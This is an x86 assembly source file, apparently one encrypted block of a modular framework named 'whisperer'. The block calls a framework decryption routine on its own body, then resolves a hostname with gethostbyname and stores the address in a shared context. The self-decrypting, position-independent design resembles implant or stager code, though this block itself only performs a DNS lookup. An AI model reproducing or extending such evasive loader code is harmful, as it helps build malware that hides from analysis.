use32
org 0



StartupBlockCall:
        push ebp
        mov ebp, esp

        mov ebx, 0xaaaaaaaa ;key0
        mov edx, 0xbbbbbbbb ;key1
        mov ecx, .call_end - .call_begin

        mov eax, [ebp + 8] ; eax = whisperer context
        mov eax, [eax] ; eax = whisperer framework
        mov eax, [eax + 16] ; eax = decryption function

        call eax

.call_begin:
dq 0x2222222222222222 ; delimiter, gets filled with nops at run time

        mov ebx, [ebp + 8] ; ebx = context
        mov eax, ebx ; eax = context
        mov ebx, [ebx] ; ebx = framework base

        add eax, 574 ; eax = HostToResolve

        push eax
        call dword [ebx + 40] ; call gethostbyname, eax = hostentry

        test eax, eax
        jz .failure


;typedef struct hostent {
;  char FAR      *h_name;  ; 0
;  char FAR  FAR **h_aliases;  ; 4
;  short         h_addrtype;  ; 8
;  short         h_length;   ; 10
;  char FAR  FAR **h_addr_list; ;12
;} HOSTENT, *PHOSTENT, FAR *LPHOSTENT;

    ;    push eax ; save hostent address

        mov bx, word [eax + 8] ; bx = h_addrtype
        cmp bx, 2
        je .v4_write

        cmp bx, 23
        je .v6_write

        jmp .failure

.v4_write:
        mov ecx, [ebp + 8] ; ecx = context
        mov word [ecx + 836], bx ; set address type

        mov ebx, dword [eax + 12] ; ebx = h_addr_list
        mov ebx, [ebx] ; ebx = first ptr to address
        mov ebx, [ebx] ; ebx = address

        mov dword [ecx + 554], ebx ; write in address

        jmp .exit

.v6_write:
        mov ecx, [ebp + 8] ; ecx = context
        mov word [ecx + 836], bx ; set address type
        mov ebx, dword [eax + 12] ; ebx = h_addr_list
        mov ebx, [ebx] ; ebx = first address ptr


        push 16    ; length
        push ebx   ; source

        add ecx, 558
        push ecx   ; destination
        call .write

        jmp .exit

.write: ; pretty much just a memcpy implementation
        push ebp
        mov ebp, esp

        mov ecx, [ebp + 16] ; ecx = length
        mov edi, [ebp + 8]  ; edi = dst
        mov esi, [ebp + 12] ; esi = src

        rep movsb ; perform copy

        pop ebp
        ret 12

.failure:
.exit:
        db 5 dup (0x90)

        xor eax, eax
     ;   mov esp, ebp
        pop ebp
        ret 4



.call_end: